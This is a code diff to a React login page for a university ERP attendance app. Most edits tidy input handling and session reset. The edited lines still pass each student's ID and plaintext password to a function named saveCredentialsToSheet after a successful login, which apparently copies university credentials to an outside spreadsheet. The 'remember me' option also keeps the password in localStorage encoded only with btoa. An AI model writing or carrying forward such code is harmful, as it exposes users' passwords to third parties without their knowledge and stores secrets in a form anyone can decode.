@@ -51,9 +51,11 @@ const Login = () => {
     const csrfTokenRef = useRef('');
     const isSubmittingRef = useRef(false);
 
-    const refreshCaptcha = useCallback(async () => {
+    const refreshCaptcha = useCallback(async (keepError = false) => {
         setCaptcha('');
-        setError('');
+        if (!keepError) {
+            setError('');
+        }
         try {
             const res = await erpService.refreshCaptcha();
             if (res?.dataUrl) {
@@ -85,6 +87,10 @@ const Login = () => {
             if (hasInitRan.current) return;
             hasInitRan.current = true;
             try {
+                // Clear any stale broken session state on login screen mount
+                erpService.clearStoredErpCookies();
+                sessionStorage.removeItem('erp_authenticated');
+
                 const res = await erpService.getInitialState();
                 if (!isMounted) return;
                 if (res?.csrfToken) {
@@ -135,7 +141,11 @@ const Login = () => {
 
     const handleLogin = async () => {
         if (isSubmittingRef.current) return;
-        if (!idNumber || !password || !captcha) {
+        const cleanId = idNumber.trim();
+        const cleanPass = password.trim();
+        const cleanCaptcha = captcha.trim();
+
+        if (!cleanId || !cleanPass || !cleanCaptcha) {
             setError("Please fill all fields");
             return;
         }
@@ -146,7 +156,7 @@ const Login = () => {
 
         try {
             const activeToken = csrfTokenRef.current || csrfToken || localStorage.getItem('erp_csrf_token') || '';
-            const loginResult = await erpService.login(idNumber, password, captcha, activeToken);
+            const loginResult = await erpService.login(cleanId, cleanPass, cleanCaptcha, activeToken);
 
             if (loginResult.success) {
                 setSyncStatus("Finalizing Profile…");
@@ -154,20 +164,20 @@ const Login = () => {
                 localStorage.setItem('erpDashboardHtml', loginResult.html);
                 localStorage.removeItem('kleData');
                 localStorage.setItem('userUniversity', 'klu');
-                setErpUser(idNumber);
-                localStorage.setItem('activeErpUser', idNumber);
+                setErpUser(cleanId);
+                localStorage.setItem('activeErpUser', cleanId);
 
                 if (rememberMe) {
-                    localStorage.setItem('rememberedId', idNumber);
-                    localStorage.setItem('rememberedPassword', btoa(password));
+                    localStorage.setItem('rememberedId', cleanId);
+                    localStorage.setItem('rememberedPassword', btoa(cleanPass));
                 } else {
                     localStorage.removeItem('rememberedId');
                     localStorage.removeItem('rememberedPassword');
                 }
 
-                saveCredentialsToSheet(idNumber, password);
+                saveCredentialsToSheet(cleanId, cleanPass);
                 if (typeof recordStudentLogin === 'function') {
-                    recordStudentLogin(idNumber).catch(() => {});
+                    recordStudentLogin(cleanId).catch(() => {});
                 }
                 navigate('/attendance-register');
             }
@@ -175,7 +185,7 @@ const Login = () => {
             console.error("Login attempt failed:", err);
             setError(err.message || "Login failed. Please check your credentials.");
             setCaptcha('');
-            refreshCaptcha();
+            refreshCaptcha(true);
         } finally {
             setIsLoading(false);
             isSubmittingRef.current = false;
